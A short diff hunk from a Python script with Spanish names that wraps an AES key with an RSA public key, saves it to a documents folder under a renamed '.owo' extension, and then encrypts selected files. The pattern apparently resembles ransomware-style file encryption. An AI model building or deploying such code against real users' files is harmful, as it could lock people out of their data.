@@ -140,7 +140,7 @@ public_key_pem = leer_clave_publica()
 clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)
 
 # Guardar la clave cifrada en un archivo
-with open(os.path.join(documents_dir, 'clave_aes_cifrada.txt'), 'w') as f:
+with open(os.path.join(documents_dir, 'clave_aes_cifrada.owo'), 'w') as f:
     f.write(clave_aes_cifrada)
 
 # Cifrar los archivos seleccionados
